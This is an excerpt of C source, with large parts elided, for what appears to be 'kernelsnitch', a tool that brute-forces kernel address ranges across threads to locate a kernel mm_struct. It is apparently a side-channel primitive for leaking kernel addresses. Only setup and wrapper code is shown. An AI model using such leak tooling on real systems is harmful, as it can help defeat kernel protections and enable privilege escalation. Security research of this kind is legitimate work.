 ...
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled, size_t __identity_start, size_t __identity_end)
{
    ...
    ks->identity_start = __identity_start ? __identity_start : IDENTITY_START;
    ks->identity_end = __identity_end ? __identity_end : IDENTITY_END;
    ks->identity_diff = ((ks->identity_end - ks->identity_start)/ks->thread_cnt);
...
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ...
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        ...
        mm_leak_arg->range.start = ks->identity_start + ks->identity_diff*i;
        mm_leak_arg->range.end = ks->identity_start + ks->identity_diff*(i+1);
 ...
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled, size_t __identity_start, size_t __identity_end)
{
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled, __identity_start, __identity_end);
 ...
 */
size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __identity_start, size_t __identity_end)
{
    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0, 0, __identity_start, __identity_end);
}
